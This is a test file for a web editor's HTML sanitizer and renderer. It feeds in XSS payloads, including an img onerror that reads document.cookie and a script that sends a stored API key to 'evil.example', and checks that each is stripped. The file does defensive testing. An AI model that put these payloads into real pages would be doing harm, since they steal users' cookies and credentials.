import { describe, expect, it } from "vitest";
import { blocksToHtml, blocksToText, inlineToText, sanitizeInline, type EditorDoc } from "@/lib/blocks";

describe("sanitizeInline", () => {
  it("keeps simple formatting tags and drops their attributes", () => {
    expect(sanitizeInline('<b class="x">bold</b> and <i>italic</i> and <u>under</u>')).toBe(
      "<b>bold</b> and <i>italic</i> and <u>under</u>",
    );
  });

  it("drops script tags including their contents", () => {
    expect(sanitizeInline('before<script>alert(1)</script>after')).toBe("beforeafter");
  });

  it("drops style tag contents too", () => {
    expect(sanitizeInline('a<style>body{display:none}</style>b')).toBe("ab");
  });

  it("drops img/onerror payloads", () => {
    expect(sanitizeInline('x<img src=x onerror=alert(document.cookie)>y')).toBe("xy");
  });

  it("drops event handlers on allowed tags", () => {
    expect(sanitizeInline('<b onmouseover="steal()">hi</b>')).toBe("<b>hi</b>");
  });

  it("keeps http(s) links but strips javascript: urls", () => {
    expect(sanitizeInline('<a href="https://example.com/a?b=1">link</a>')).toBe(
      '<a href="https://example.com/a?b=1" rel="noopener noreferrer">link</a>',
    );
    expect(sanitizeInline('<a href="javascript:alert(1)">link</a>')).toBe("<a>link</a>");
  });

  it("escapes stray angle brackets that are not tags", () => {
    expect(sanitizeInline("1 < 2 and <notatag")).toBe("1 &lt; 2 and &lt;notatag");
  });

  it("preserves <br>", () => {
    expect(sanitizeInline("a<br>b")).toBe("a<br>b");
  });
});

describe("blocksToHtml", () => {
  const doc: EditorDoc = {
    blocks: [
      { type: "header", data: { text: "Title", level: 1 } },
      { type: "paragraph", data: { text: "Hello <b>world</b>" } },
      {
        type: "table",
        data: { withHeadings: true, content: [["Hazard", "Control"], ["Fall", "Harness"]] },
      },
    ],
  };

  it("renders headers, paragraphs, and tables", () => {
    const html = blocksToHtml(doc);
    expect(html).toContain("<h1");
    expect(html).toContain("Hello <b>world</b>");
    expect(html).toContain("<th");
    expect(html).toContain("Harness");
  });

  it("never lets model-supplied script through to the preview", () => {
    const hostile: EditorDoc = {
      blocks: [{ type: "paragraph", data: { text: '<script>fetch("https://evil.example/"+localStorage.anthropic_api_key)</script>' } }],
    };
    expect(blocksToHtml(hostile)).not.toContain("<script");
  });
});

describe("blocksToText", () => {
  it("renders a markdown-ish plain text document", () => {
    const doc: EditorDoc = {
      blocks: [
        { type: "header", data: { text: "Safety <b>Plan</b>", level: 2 } },
        { type: "paragraph", data: { text: "Scope of works &amp; access." } },
        { type: "list", data: { style: "unordered", items: [{ content: "PPE" }, { content: "Permits", items: [{ content: "Hot work" }] }] } },
        { type: "table", data: { withHeadings: true, content: [["A", "B"], ["1", "2"]] } },
        { type: "quote", data: { text: "Zero harm", caption: "Site policy" } },
      ],
    };
    const text = blocksToText(doc);
    expect(text).toContain("## Safety Plan");
    expect(text).toContain("Scope of works & access.");
    expect(text).toContain("- PPE");
    expect(text).toContain("  - Hot work");
    expect(text).toContain("| A | B |");
    expect(text).toContain("> Zero harm");
    expect(text).not.toContain("<b>");
  });

  it("inlineToText strips tags and decodes entities", () => {
    expect(inlineToText("a <b>b</b> &lt;tag&gt; &#65;")).toBe("a b <tag> A");
  });
});
